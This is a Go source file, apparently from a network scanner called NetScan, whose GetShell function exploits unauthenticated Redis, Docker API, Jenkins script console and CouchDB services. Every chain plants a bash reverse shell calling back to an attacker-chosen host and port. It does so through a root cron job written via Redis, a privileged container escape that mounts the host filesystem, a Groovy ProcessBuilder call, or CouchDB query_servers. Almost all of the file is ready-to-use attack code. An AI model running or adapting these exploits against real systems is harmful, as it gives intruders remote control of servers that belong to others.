package scanner

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
	"time"
)

// GetShell 一键拿 shell: 检测未授权 → 根据服务类型选择利用链写反弹 shell
// 支持内置: Redis cron / Docker 容器逃逸 / Jenkins 脚本控制台 / CouchDB
// 平台化: 用户自定义拿 shell 链(shells/ 目录)
func GetShell(ip string, port int, lhost string, lport int, timeout time.Duration) string {
	// 内置利用链
	switch port {
	case 6379:
		if vuln := RunPOC(ip, port, timeout); vuln == "" {
			return "目标端口未发现未授权访问"
		}
		return redisCronShell(ip, port, lhost, lport, timeout)
	case 2375, 2376:
		if vuln := RunPOC(ip, port, timeout); vuln == "" {
			return "目标端口未发现未授权访问"
		}
		return dockerEscapeShell(ip, port, lhost, lport, timeout)
	case 8080, 8090:
		return jenkinsScriptShell(ip, port, lhost, lport, timeout)
	case 5984:
		return couchdbShell(ip, port, lhost, lport, timeout)
	}

	// 平台化: 用户自定义拿 shell 链(自带检测与利用步骤)
	if chain := OpenShellChainManager("").Find(port); chain != nil {
		return chain.Execute(ip, port, lhost, lport, timeout)
	}

	// 内置 RCE 拿 shell 链(HTTP 类, 在用户指定端口上逐一尝试)
	for _, c := range genShellChains {
		if r := c.Execute(ip, port, lhost, lport, timeout); !strings.HasPrefix(r, "检测未命中") {
			return r
		}
	}

	return fmt.Sprintf("端口 %d 未命中可利用漏洞(支持: 6379 Redis, 2375 Docker, 8080/8090 Jenkins, 5984 CouchDB, RCE链, 或自定义 shells/*.yaml)", port)
}

// redisCronShell 通过 Redis 未授权写 cron 定时任务反弹 shell
func redisCronShell(ip string, port int, lhost string, lport int, timeout time.Duration) string {
	conn, err := dialTimeout(net.JoinHostPort(ip, itoa(port)), timeout)
	if err != nil {
		return "连接失败: " + err.Error()
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(timeout))

	payload := fmt.Sprintf("\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%d 0>&1\n\n", lhost, lport)
	setCmd := fmt.Sprintf("*3\r\n$3\r\nSET\r\n$1\r\nx\r\n$%d\r\n%s\r\n", len(payload), payload)

	cmds := []string{
		"CONFIG SET dir /var/spool/cron\r\n",
		"CONFIG SET dbfilename root\r\n",
		setCmd,
		"SAVE\r\n",
	}
	for _, c := range cmds {
		if _, err := conn.Write([]byte(c)); err != nil {
			return "写入失败: " + err.Error()
		}
		buf := make([]byte, 1024)
		n, _ := conn.Read(buf)
		resp := string(buf[:n])
		if strings.HasPrefix(resp, "-ERR") {
			return "写入失败: " + strings.TrimSpace(resp)
		}
	}
	return fmt.Sprintf("已写入 cron 反弹 shell: /var/spool/cron/root (回连 %s:%d)", lhost, lport)
}

// dockerEscapeShell 通过 Docker API 未授权创建特权容器逃逸并反弹 shell
func dockerEscapeShell(ip string, port int, lhost string, lport int, timeout time.Duration) string {
	// 0. 先清理旧的同名逃逸容器(避免名称冲突导致创建失败)
	_, _ = httpDo(ip, port, "DELETE", "/containers/netscan_escape?force=1", "", "", timeout)

	// 1. 创建特权容器, 挂载宿主根目录 / 到 /host
	createBody := `{"Image":"alpine","HostConfig":{"Privileged":true,"Binds":["/:/host"],"NetworkMode":"host"},"Cmd":["sleep","3600"]}`
	body, status := httpDo(ip, port, "POST", "/containers/create?name=netscan_escape", createBody, "application/json", timeout)
	if status == 0 {
		return "Docker API 不可达"
	}
	var created struct {
		ID string `json:"Id"`
	}
	_ = json.Unmarshal([]byte(body), &created)
	if created.ID == "" {
		return "创建容器失败: " + body
	}
	id := created.ID

	// 2. 启动容器
	if _, s := httpDo(ip, port, "POST", "/containers/"+id+"/start", "", "", timeout); s != 204 && s != 200 {
		return fmt.Sprintf("启动容器失败: %d", s)
	}

	// 3. 创建 exec(挂载宿主后执行反弹 shell)
	shell := fmt.Sprintf("chroot /host /bin/sh -c 'bash -i >& /dev/tcp/%s/%d 0>&1'", lhost, lport)
	execBodyBytes, _ := json.Marshal(map[string]interface{}{
		"Cmd":          []string{"/bin/sh", "-c", shell},
		"AttachStdout": true,
		"AttachStderr": true,
	})
	execResp, _ := httpDo(ip, port, "POST", "/containers/"+id+"/exec", string(execBodyBytes), "application/json", timeout)
	var execCreated struct {
		ID string `json:"Id"`
	}
	_ = json.Unmarshal([]byte(execResp), &execCreated)
	if execCreated.ID == "" {
		return "创建 exec 失败"
	}
	// 4. 启动 exec
	startBody, _ := json.Marshal(map[string]interface{}{"Detach": true})
	_, _ = httpDo(ip, port, "POST", "/exec/"+execCreated.ID+"/start", string(startBody), "application/json", timeout)
	return fmt.Sprintf("已通过 Docker 容器逃逸执行反弹 shell (回连 %s:%d)", lhost, lport)
}

// jenkinsScriptShell 通过 Jenkins 未授权脚本控制台执行 Groovy 反弹 shell
func jenkinsScriptShell(ip string, port int, lhost string, lport int, timeout time.Duration) string {
	// 使用带 cookie jar 的客户端: Jenkins crumb 绑定 session, 必须跨请求保留 cookie
	jar, _ := cookiejar.New(nil)
	client := httpClient(timeout)
	client.Jar = jar
	base := fmt.Sprintf("http://%s", net.JoinHostPort(ip, itoa(port)))

	// 1. 检查 /script 是否可匿名访问(200 且含 Script Console)
	body, status := doHTTPReq(client, "GET", base+"/script", "", "", nil)
	if status != 200 || !strings.Contains(body, "Script Console") {
		return "Jenkins 脚本控制台不可匿名访问"
	}
	// 2. 获取 CSRF crumb(Jenkins 2.176+ 默认开启, POST 必须携带 crumb + session cookie)
	crumb := ""
	crumbField := "Jenkins-Crumb"
	if cBody, cStatus := doHTTPReq(client, "GET", base+"/crumbIssuer/api/json", "", "", nil); cStatus == 200 {
		var crumbResp struct {
			Crumb             string `json:"crumb"`
			CrumbRequestField string `json:"crumbRequestField"`
		}
		if json.Unmarshal([]byte(cBody), &crumbResp) == nil && crumbResp.Crumb != "" {
			crumb = crumbResp.Crumb
			if crumbResp.CrumbRequestField != "" {
				crumbField = crumbResp.CrumbRequestField
			}
		}
	}
	// 3. 执行 Groovy 反弹 shell
	groovy := fmt.Sprintf("new ProcessBuilder(\"bash\",\"-c\",\"bash -i >& /dev/tcp/%s/%d 0>&1\").start()", lhost, lport)
	form := url.Values{}
	form.Set("script", groovy)
	form.Set("Submit", "Run")
	headers := map[string]string{}
	if crumb != "" {
		headers[crumbField] = crumb
	}
	_, status = doHTTPReq(client, "POST", base+"/script", form.Encode(), "application/x-www-form-urlencoded", headers)
	if status == 200 || status == 302 {
		return fmt.Sprintf("已通过 Jenkins 脚本控制台执行反弹 shell (回连 %s:%d)", lhost, lport)
	}
	return fmt.Sprintf("Jenkins 脚本执行返回状态码 %d", status)
}

// couchdbShell 通过 CouchDB 未授权配置 query_servers 执行命令反弹 shell (CVE-2017-12636)
func couchdbShell(ip string, port int, lhost string, lport int, timeout time.Duration) string {
	// 1. 检测未授权(能读 _all_dbs)
	_, status := httpDo(ip, port, "GET", "/_all_dbs", "", "", timeout)
	if status != 200 {
		return "CouchDB 未授权访问不可用"
	}
	// 2. 通过 _config 添加 query server cmd
	shell := fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", lhost, lport)
	shellJSON, _ := json.Marshal(shell)
	_, status = httpDo(ip, port, "PUT", "/_config/query_servers/cmd", string(shellJSON), "application/json", timeout)
	if status != 200 && status != 201 && status != 202 {
		return fmt.Sprintf("CouchDB 未授权但无配置权限(状态码 %d)", status)
	}
	// 3. 触发 query server 执行命令: 建库 → 建文档 → _temp_view 指定 language=cmd
	db := fmt.Sprintf("/netscan_%d", time.Now().UnixNano()%100000)
	httpDo(ip, port, "PUT", db, "", "application/json", timeout)
	httpDo(ip, port, "PUT", db+"/test", `{"_id":"test"}`, "application/json", timeout)
	httpDo(ip, port, "POST", db+"/_temp_view?limit=10", `{"language":"cmd","map":""}`, "application/json", timeout)
	return fmt.Sprintf("已通过 CouchDB query_servers 配置执行命令 (回连 %s:%d)", lhost, lport)
}

// httpDo 发送 HTTP 请求并返回响应体与状态码
func httpDo(ip string, port int, method, path, body, contentType string, timeout time.Duration) (string, int) {
	return httpDoHeaders(ip, port, method, path, body, contentType, nil, timeout)
}

// httpDoHeaders 发送 HTTP 请求(支持自定义请求头)并返回响应体与状态码
func httpDoHeaders(ip string, port int, method, path, body, contentType string, headers map[string]string, timeout time.Duration) (string, int) {
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	urlStr := fmt.Sprintf("http://%s%s", net.JoinHostPort(ip, itoa(port)), path)
	return doHTTPReq(httpClient(timeout), method, urlStr, body, contentType, headers)
}

// doHTTPReq 使用指定客户端发送 HTTP 请求(支持自定义请求头, 可复用带 cookie jar 的客户端)
func doHTTPReq(client *http.Client, method, urlStr, body, contentType string, headers map[string]string) (string, int) {
	req, err := http.NewRequest(method, urlStr, strings.NewReader(body))
	if err != nil {
		return "", 0
	}
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	req.Header.Set("User-Agent", "NetScan/3.0")
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return "", 0
	}
	defer resp.Body.Close()
	b := readAll(resp.Body)
	return b, resp.StatusCode
}
